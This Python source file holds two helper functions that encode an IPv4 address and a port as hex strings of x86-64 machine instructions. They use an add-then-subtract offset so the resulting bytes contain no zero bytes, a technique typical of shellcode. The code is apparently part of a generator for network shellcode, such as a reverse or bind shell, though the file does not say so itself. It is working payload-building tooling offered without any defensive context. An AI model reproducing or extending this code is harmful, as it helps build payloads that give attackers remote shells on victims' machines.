def ip(ip: str) -> str:
    """
    Create an assembly bloc of instructions for the ip address

    Args:
        ip (str): IPv4 address generated by dechex.ip()

    Returns:
        str: Return the assembly bloc of instructions for the ip address
    """

    ip_bloc = "beip4881ee11111111"
    ip = "0x" + ip
    hex_ip = hex(int(ip,16) + int("0x11111111",16))
    hex_ip = str(hex_ip)[2:]
    temp_ip = ""
    for i in range(6,-1,-2):
        temp_ip += hex_ip[i]
        temp_ip += hex_ip[i+1]
    ip_bloc = ip_bloc.replace("ip",temp_ip)

    return ip_bloc

def port(port: str) -> str:
    
    """
    Create an assembly bloc of instructions for the port 

    Args:
        port (str): Port generated by dechex.port()

    Returns:
        str: Return the assembly bloc of instructions for the port
    """

    port_bloc = "6641beport6641bdminus664181ed1111664529ee664156"
    minus = ""
    
    if(len(port) == 3):
        port = "0" + port
    port = port[2:4] + port[0:2]
    newport = port.replace("0","1")

    for i in range(0,len(newport)):
        if port[i] == "0" and newport[i] == "1":
            minus += "2"
        else :
            minus += "1"

    port_bloc = port_bloc.replace("port",newport)
    port_bloc = port_bloc.replace("minus",minus)

    return port_bloc